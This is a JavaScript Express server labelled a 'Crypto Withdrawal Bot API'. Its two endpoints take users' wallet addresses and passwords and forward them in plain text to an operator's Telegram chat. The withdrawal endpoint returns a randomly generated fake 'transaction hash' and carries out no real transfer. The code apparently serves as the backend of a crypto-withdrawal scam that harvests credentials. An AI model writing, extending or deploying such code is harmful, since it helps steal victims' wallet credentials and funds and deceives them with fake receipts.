import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import fetch from "node-fetch";

const app = express();
app.use(cors());
app.use(bodyParser.json());

// ===== ENV VARIABLES =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

// Debugging ENV
console.log("BOT_TOKEN:", !!BOT_TOKEN);
console.log("ADMIN_CHAT_ID:", ADMIN_CHAT_ID);
console.log("PORT:", PORT);

// ====== TEST ROOT ======
app.get("/", (req, res) => {
  res.send("Crypto Withdrawal Bot API running");
});

// ========================================================
//  🚀 WALLET BINDING API
// ========================================================
app.post("/api/wallet", async (req, res) => {
  try {
    const { wallet, password, coin = "N/A" } = req.body;

    if (!wallet || !password) {
      return res.status(400).json({ error: "Missing wallet or password" });
    }

    console.log("Wallet bind request:", req.body);

    const message = 
`🔐 NEW WALLET BINDING
--------------------------------
🏦 Wallet: ${wallet}
🔑 Password: ${password}
💰 Coin: ${coin}

⚠️ Wallet & password can be bound once.`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message
      })
    });

    return res.json({ ok: true, message: "Wallet binding sent to admin." });

  } catch (err) {
    console.error("Wallet API ERROR:", err);
    return res.status(500).json({ error: "Backend Error" });
  }
});

// ========================================================
//  🚀 WITHDRAW REQUEST API
// ========================================================
app.post("/api/withdraw", async (req, res) => {
  try {
    const { coin, amount, usdt, wallet, password } = req.body;

    if (!coin || !amount || !usdt || !wallet || !password) {
      return res.status(400).json({ error: "Missing fields" });
    }

    // Generate transaction hash
    const hash = "#TX" + Math.floor(Math.random() * 999999999);

    console.log("Withdraw request:", req.body);

    const message =
`📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: ${coin}
🔢 Amount: ${amount}
💵 USDT: ${usdt}
🏦 Wallet: ${wallet}
🔐 Password: ${password}
🆔 Transaction Hash: ${hash}
⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message
      })
    });

    return res.json({ ok: true, hash });

  } catch (err) {
    console.error("Withdraw API ERROR:", err);
    return res.status(500).json({ error: "Backend Error" });
  }
});

// ========================================================
//  🚀 START SERVER
// ========================================================
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
